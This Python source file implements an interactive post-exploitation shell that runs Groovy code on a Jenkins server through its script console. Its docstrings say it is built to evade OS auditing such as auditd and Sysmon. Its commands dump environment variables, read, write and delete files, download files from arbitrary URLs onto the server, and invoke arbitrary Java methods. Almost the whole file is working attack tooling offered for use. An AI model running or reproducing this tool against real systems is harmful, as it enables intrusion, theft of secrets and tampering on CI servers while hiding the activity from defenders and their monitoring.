"""Groovy Pseudo-Shell for JVM-native command execution.

Implements a shell interface that translates common OS commands into
pure Java/Groovy API calls, evading OS-level auditing and process monitoring.
"""

from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class GroovyCommand:
    """Represents a Groovy shell command mapping."""
    name: str
    groovy_code: str
    description: str
    requires_args: bool = False


class GroovyShell:
    """JVM-native pseudo-shell that operates entirely within the Jenkins JVM.

    Evades OS-level auditing (auditd, Sysmon) by never forking processes.
    All operations execute via Java/Groovy native APIs.
    """

    def __init__(self, session: Any):
        """Initialize Groovy shell.

        Args:
            session: Authenticated Jenkins session
        """
        self.session = session
        self.commands = self._register_commands()

    def _register_commands(self) -> dict[str, GroovyCommand]:
        """Register all supported pseudo-shell commands.

        Returns:
            Dictionary mapping command names to GroovyCommand objects
        """
        return {
            "pwd": GroovyCommand(
                name="pwd",
                groovy_code="println new File('.').absolutePath",
                description="Print working directory"
            ),
            "ls": GroovyCommand(
                name="ls",
                groovy_code="""
def dir = args?.size() > 0 ? new File(args[0]) : new File('.')
if (!dir.exists()) {
    println "Directory not found: " + dir.absolutePath
} else {
    dir.listFiles()?.each { f ->
        def perms = (f.canRead() ? 'r' : '-') + (f.canWrite() ? 'w' : '-') + (f.canExecute() ? 'x' : '-')
        def type = f.isDirectory() ? 'd' : '-'
        def size = f.length()
        def name = f.name
        println String.format('%s%s %10d %s', type, perms, size, name)
    }
}
""",
                description="List directory contents",
                requires_args=True
            ),
            "cat": GroovyCommand(
                name="cat",
                groovy_code="""
if (args?.size() < 1) {
    println "Usage: cat <file>"
} else {
    def file = new File(args[0])
    if (!file.exists()) {
        println "File not found: " + file.absolutePath
    } else if (file.isDirectory()) {
        println "Error: " + file.absolutePath + " is a directory"
    } else {
        println file.text
    }
}
""",
                description="Read file contents",
                requires_args=True
            ),
            "find": GroovyCommand(
                name="find",
                groovy_code="""
def searchDir = args?.size() > 0 ? new File(args[0]) : new File('.')
def maxDepth = args?.size() > 1 ? args[1].toInteger() : 3

def findFiles(dir, currentDepth) {
    if (currentDepth > maxDepth) return
    dir.listFiles()?.each { f ->
        println f.absolutePath
        if (f.isDirectory()) {
            findFiles(f, currentDepth + 1)
        }
    }
}

findFiles(searchDir, 0)
""",
                description="Find files recursively",
                requires_args=True
            ),
            "whoami": GroovyCommand(
                name="whoami",
                groovy_code="println System.getProperty('user.name')",
                description="Print current user"
            ),
            "hostname": GroovyCommand(
                name="hostname",
                groovy_code="println InetAddress.getLocalHost().getHostName()",
                description="Print hostname"
            ),
            "env": GroovyCommand(
                name="env",
                groovy_code="""
System.getenv().each { k, v ->
    println k + '=' + v
}
""",
                description="Print environment variables"
            ),
            "ifconfig": GroovyCommand(
                name="ifconfig",
                groovy_code="""
import java.net.NetworkInterface
NetworkInterface.getNetworkInterfaces().each { iface ->
    println '\\nInterface: ' + iface.name + ' (' + iface.displayName + ')'
    println 'Up: ' + iface.isUp()
    println 'Loopback: ' + iface.isLoopback()
    iface.inetAddresses.each { addr ->
        println '  Address: ' + addr.hostAddress
    }
}
""",
                description="Show network interfaces"
            ),
            "ps": GroovyCommand(
                name="ps",
                groovy_code="""
import java.lang.management.ManagementFactory
def runtime = ManagementFactory.getRuntimeMXBean()
println 'Current JVM Process:'
println 'PID: ' + runtime.name.split('@')[0]
println 'Uptime: ' + (runtime.uptime / 1000) + 's'
println 'ClassPath: ' + runtime.classPath

def threads = Thread.getAllStackTraces().keySet()
println '\\nActive Threads: ' + threads.size()
threads.each { t ->
    println '  ' + t.name + ' [' + t.state + ']'
}
""",
                description="Show JVM process information"
            ),
            "df": GroovyCommand(
                name="df",
                groovy_code="""
File.listRoots().each { root ->
    def total = root.totalSpace
    def free = root.freeSpace
    def used = total - free
    def pctUsed = total > 0 ? (used * 100 / total) : 0
    println String.format('%s: Total=%dGB Free=%dGB Used=%dGB (%.1f%%)',
        root.absolutePath, total/1024/1024/1024, free/1024/1024/1024,
        used/1024/1024/1024, pctUsed)
}
""",
                description="Show disk usage"
            ),
            "id": GroovyCommand(
                name="id",
                groovy_code="""
println 'uid=' + System.getProperty('user.name')
println 'home=' + System.getProperty('user.home')
println 'dir=' + System.getProperty('user.dir')
println 'os=' + System.getProperty('os.name') + ' ' + System.getProperty('os.version')
println 'arch=' + System.getProperty('os.arch')
println 'java=' + System.getProperty('java.version')
""",
                description="Show user and system identity"
            ),
            "grep": GroovyCommand(
                name="grep",
                groovy_code="""
if (args?.size() < 2) {
    println "Usage: grep <pattern> <file>"
} else {
    def pattern = args[0]
    def file = new File(args[1])
    if (!file.exists()) {
        println "File not found: " + file.absolutePath
    } else {
        file.eachLine { line ->
            if (line =~ pattern) {
                println line
            }
        }
    }
}
""",
                description="Search for pattern in file",
                requires_args=True
            ),
            "write": GroovyCommand(
                name="write",
                groovy_code="""
if (args?.size() < 2) {
    println "Usage: write <file> <content>"
} else {
    def file = new File(args[0])
    def content = args[1..-1].join(' ')
    file.text = content
    println "Wrote " + content.length() + " bytes to " + file.absolutePath
}
""",
                description="Write content to file",
                requires_args=True
            ),
            "mkdir": GroovyCommand(
                name="mkdir",
                groovy_code="""
if (args?.size() < 1) {
    println "Usage: mkdir <directory>"
} else {
    def dir = new File(args[0])
    if (dir.mkdirs()) {
        println "Created: " + dir.absolutePath
    } else {
        println "Failed to create: " + dir.absolutePath
    }
}
""",
                description="Create directory",
                requires_args=True
            ),
            "rm": GroovyCommand(
                name="rm",
                groovy_code="""
if (args?.size() < 1) {
    println "Usage: rm <file>"
} else {
    def file = new File(args[0])
    if (file.delete()) {
        println "Deleted: " + file.absolutePath
    } else {
        println "Failed to delete: " + file.absolutePath
    }
}
""",
                description="Remove file",
                requires_args=True
            ),
            "download": GroovyCommand(
                name="download",
                groovy_code="""
if (args?.size() < 2) {
    println "Usage: download <url> <output_file>"
} else {
    def url = new URL(args[0])
    def file = new File(args[1])
    file.bytes = url.bytes
    println "Downloaded " + file.length() + " bytes to " + file.absolutePath
}
""",
                description="Download file from URL",
                requires_args=True
            ),
            "exec": GroovyCommand(
                name="exec",
                groovy_code="""
if (args?.size() < 1) {
    println "Usage: exec <class> <method> [args...]"
} else {
    def className = args[0]
    def methodName = args[1]
    def methodArgs = args.size() > 2 ? args[2..-1] : []

    try {
        def clazz = Class.forName(className)
        def method = clazz.getMethod(methodName, String[].class)
        def result = method.invoke(null, [methodArgs as String[]] as Object[])
        println result
    } catch (Exception e) {
        println "Error: " + e.message
    }
}
""",
                description="Execute Java static method",
                requires_args=True
            )
        }

    def _execute_groovy(self, script: str) -> Optional[str]:
        """Execute Groovy script on Jenkins.

        Args:
            script: Groovy script to execute

        Returns:
            Script output or None on failure
        """
        try:
            response = self.session.post(
                f"{self.session.target}/scriptText",
                data={"script": script}
            )

            if response.status_code == 200:
                return response.text
            return None
        except Exception:
            return None

    def execute_command(self, command: str, *args: str) -> Optional[str]:
        """Execute pseudo-shell command.

        Args:
            command: Command name
            *args: Command arguments

        Returns:
            Command output or error message
        """
        if command not in self.commands:
            return f"Unknown command: {command}. Type 'help' for available commands."

        cmd = self.commands[command]

        groovy_script = f"def args = {list(args)}\n" + cmd.groovy_code

        return self._execute_groovy(groovy_script)

    def execute_raw_groovy(self, groovy_code: str) -> Optional[str]:
        """Execute arbitrary Groovy code.

        Args:
            groovy_code: Groovy code to execute

        Returns:
            Execution output
        """
        return self._execute_groovy(groovy_code)

    def list_commands(self) -> list[dict[str, str]]:
        """List all available commands.

        Returns:
            List of command information dictionaries
        """
        return [
            {
                "name": cmd.name,
                "description": cmd.description,
                "requires_args": cmd.requires_args
            }
            for cmd in self.commands.values()
        ]

    def get_help(self) -> str:
        """Get help text for all commands.

        Returns:
            Formatted help text
        """
        help_text = "Groovy Pseudo-Shell Commands:\n\n"

        for cmd in sorted(self.commands.values(), key=lambda x: x.name):
            help_text += f"  {cmd.name:15} - {cmd.description}\n"

        help_text += "\nNote: All commands execute via JVM APIs (no OS process forking)\n"

        return help_text


class InteractiveGroovyShell:
    """Interactive shell session with command history and multi-line support."""

    def __init__(self, session: Any):
        """Initialize interactive shell.

        Args:
            session: Authenticated Jenkins session
        """
        self.shell = GroovyShell(session)
        self.history: list[str] = []
        self.running = False

    def run(self) -> None:
        """Run interactive shell loop."""
        self.running = True
        print(self.shell.get_help())
        print("\nType 'exit' to quit, 'help' for commands\n")

        while self.running:
            try:
                line = input("groovy> ").strip()

                if not line:
                    continue

                self.history.append(line)

                if line.lower() in ['exit', 'quit']:
                    self.running = False
                    continue

                if line.lower() == 'help':
                    print(self.shell.get_help())
                    continue

                if line.lower() == 'history':
                    for i, cmd in enumerate(self.history, 1):
                        print(f"{i:4d}  {cmd}")
                    continue

                parts = line.split()
                command = parts[0]
                args = parts[1:] if len(parts) > 1 else []

                result = self.shell.execute_command(command, *args)
                if result:
                    print(result)

            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
            except EOFError:
                self.running = False
            except Exception as e:
                print(f"Error: {e}")


def create_groovy_shell(session: Any) -> GroovyShell:
    """Factory function to create GroovyShell.

    Args:
        session: Authenticated Jenkins session

    Returns:
        GroovyShell instance
    """
    return GroovyShell(session)


def start_interactive_shell(session: Any) -> None:
    """Start interactive Groovy shell session.

    Args:
        session: Authenticated Jenkins session
    """
    shell = InteractiveGroovyShell(session)
    shell.run()


def execute_groovy_command(session: Any, command: str, args: Optional[list[str]] = None) -> str:
    """Execute a single Groovy shell command.

    Args:
        session: Authenticated Jenkins session
        command: Command to execute
        args: Optional command arguments

    Returns:
        Command output
    """
    shell = GroovyShell(session)
    return shell.execute_command(command, args or [])
